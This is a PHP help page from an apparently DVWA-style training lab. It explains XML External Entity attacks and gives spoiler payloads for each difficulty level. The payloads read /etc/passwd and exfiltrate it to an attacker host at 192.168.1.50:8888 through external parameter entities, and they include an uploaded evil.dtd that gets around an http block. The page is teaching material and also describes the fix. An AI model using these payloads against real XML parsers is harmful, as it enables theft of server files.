<?php 
$xmlspoiler = "
<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>
<!DOCTYPE foo [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>
<root>
	<title>&xxe;</title>
	<album> &xxe;</album>
	<artist>&xxe;</artist>
</root>";

$xmlspoilerM = "
<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://192.168.1.50:8888/example.dtd\"> %xxe;]>";

$xmlspoilerDTD ="
<!ENTITY % file SYSTEM \"file:///etc/passwd\">
<!ENTITY % eval \"<!ENTITY &#x25; exfiltrate SYSTEM 'http://192.168.1.50:8888/?x=%file;'>\">
%eval;
%exfiltrate;
";

$xmlspoilerH = "
<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM \"file:///var/www/html/hackable/uploads/evil.dtd\"> %xxe;]>";

$xmlspoilerUploadedDTD ="
<!ENTITY % file SYSTEM \"file:///etc/passwd\">
<!ENTITY % eval \"<!ENTITY &#x25; exfiltrate SYSTEM 'http://192.168.1.50:8888/?x=%file;'>\">
%eval;
%exfiltrate;
";
?>
<div class="body_padded">
	<h1>Help - XML External Identity (XXE)</h1>

	<div id="code">
	<table width='100%' bgcolor='white' style="border:2px #C0C0C0 solid">
	<tr>
	<td><div id="code">
		<h3> About </h3>
		<p>An XML External Entity attack is a type of attack against an application that parses XML input. 
		   This attack occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser.
		   This attack may lead to the disclosure of confidential data, denial of service, server side request forgery, port scanning from the perspective of the machine where the parser is located, and other system impacts.</p>

		<br /><br /><br />

		<h3>Objective</h3>
		<p>Output or exfiltrate the /etc/passwd. <h3>

		<br /><br /><br />

		<h3>Low Level</h3>
		<p>Low level will parse any XML with external entities, and therefor outputting it to the webpage.</p>
		<pre>Spoiler: <span class="spoiler"><?php echo htmlentities($xmlspoiler); ?></span>	</pre>

		<br /><br /><br />

		<h3>Medium Level</h3>
		<p>Medium level will parse any XML with external entities, but not output on the webpage.</p>
		<pre>Spoiler XML: <span class="spoiler"><?php echo htmlentities($xmlspoilerM); ?></span></pre>
		<pre>Spoiler DTD: <span class="spoiler"><?php echo htmlentities($xmlspoilerDTD); ?>
		</span></pre>

		<br /><br /><br />

		<h3>High Level</h3>
		<p>High level will parse any XML with external entities, but not output on the webpage.</p>
		<pre>Spoiler: <span class="spoiler"><br />The XML parser does not accept entities that are loaded with 'http'. Upload a DTD trough the file upload function within DVWA. After that target the uploaded DTD that points back to your own webserver.</span></pre>
		<pre>Spoiler XML: <span class="spoiler"><?php echo htmlentities($xmlspoilerH); ?></span></pre>
		<pre>Spoiler DTD: <span class="spoiler"><?php echo htmlentities($xmlspoilerUploadedDTD); ?>
		</span></pre>

		<h3>Impossible Level</h3>
		<p>At the impossible level the libxml entity loader has been set to 'false'. This prevents the XML parser from loading external entities .</p>
		</span></pre>

</div>
